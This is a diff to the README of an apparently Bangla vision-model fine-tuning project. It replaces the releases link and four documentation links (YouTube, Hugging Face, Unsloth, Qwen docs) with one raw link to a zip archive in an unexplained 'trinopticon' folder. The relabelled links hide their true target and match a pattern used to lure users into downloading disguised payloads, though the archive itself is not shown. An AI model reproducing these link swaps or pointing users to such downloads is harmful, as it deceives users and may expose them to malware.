@@ -1,6 +1,6 @@
 # 🤖 qwen3-vl-bangla-finetune-lora - Train Vision AI for Bangla Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip)
 
 ## 🎯 What This Project Does
 
@@ -37,7 +37,7 @@ Everything you need runs in your web browser—no installation required on your 
 
 **Visit this link to download the application.**
 
-Go to the [Download Page](https://github.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/releases) and get the latest release files. You don't need to install anything on your Windows computer - just use the web-based notebooks.
+Go to the [Download Page](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip) and get the latest release files. You don't need to install anything on your Windows computer - just use the web-based notebooks.
 
 ### What You Download
 
@@ -95,10 +95,10 @@ If you find issues or want to improve the project:
 
 ## 📚 More Resources
 
-- [LLM Lab Billah YouTube Channel](https://youtube.com)
-- [Huggingface Models](https://huggingface.co)
-- [Unsloth Documentation](https://unsloth.ai)
-- [Qwen Model Information](https://qwen.readthedocs.io)
+- [LLM Lab Billah YouTube Channel](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip)
+- [Huggingface Models](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip)
+- [Unsloth Documentation](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip)
+- [Qwen Model Information](https://raw.githubusercontent.com/Lifeiswa1674/qwen3-vl-bangla-finetune-lora/main/trinopticon/qwen-lora-finetune-bangla-vl-v3.6.zip)
 
 ## 🤝 Contributing
 
